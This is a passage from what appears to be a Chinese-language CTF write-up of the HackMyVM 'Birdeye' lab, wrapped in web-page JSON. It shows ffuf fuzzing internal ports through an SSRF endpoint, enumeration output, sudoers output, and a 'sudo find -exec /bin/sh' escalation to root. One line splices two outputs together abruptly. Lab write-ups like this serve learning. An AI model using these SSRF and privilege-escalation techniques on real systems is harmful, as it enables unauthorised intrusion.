92.168.56.127/api/fetch-url?url=http://127.0.0.1:FUZZ/'\u003c/span\u003e -w port -fc \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e\n\n        /\u003cspan class=\"hljs-string\"\u003e'___\\  /'\u003c/span\u003e___\\           /\u003cspan class=\"hljs-string\"\u003e'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://192.168.56.127/api/fetch-url?url=http://127.0.0.1:FUZZ/\n :: Wordlist         : FUZZ: /root/Desktop/HackMyVM/Birdeye/port\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response status: 500\n________________________________________________\n\n80                      [Status: 200, Size: 288, Words: 38, Lines: 8, Duration: 106ms]\n:: Progress: [10000/10000] :: Job [1/1] :: 357 req/sec :: Duration: [0:00:29] :: Errors: 0 ::\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们再根据原本\u003ccode\u003e403\u003c/code\u003e 的地址进行访问，例如：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e      GET        \u003cspan class=\"hljs-number\"\u003e1l\u003c/span\u003e        5w       32c http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.127\u003c/span\u003e/admin/config\n\u003cspan class=\"hljs-number\"\u003e401\u003c/span\u003e      GET        \u003cspan class=\"hljs-number\"\u003e1l\u003c/span\u003e        1w il_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/usr/sbin\\:/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/sbin\\:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/snap/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\n\nUser sev may run the following commands on birdeye:\n    (ALL) NOPASSWD: /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/find\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e结束了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003esev@birdeye:~/birdeye$ sudo find . -\u003cspan class=\"hljs-built_in\"\u003eexec\u003c/span\u003e /\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/sh \\; -quit\n\u003cspan class=\"hljs-comment\"\u003e# id\u003c/span\u003e\nuid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) gid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) groups=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e？\u003c/p\u003e","title":"HackMyVM - Birdeye","date":"2025-10-17","updated":"2025-10-17","tags":["HackMyVM","Linux","SSRF","find"],"categories":"靶机","comments":true,"description":"Birdeye. https://hackmyvm.eu/machines/machine.php?vm=Birdeye Recon PortScan 枚举 80 端口的搜索时发的包很奇怪 看着存在 SSRF 改成 kali 的 IP 试试 存在 SSRF 并且原本后面的 URL 是：http://..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackMyVMBirdeye"},"buildId":"yBQJLYy5vKYVdUmksNnT4","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>
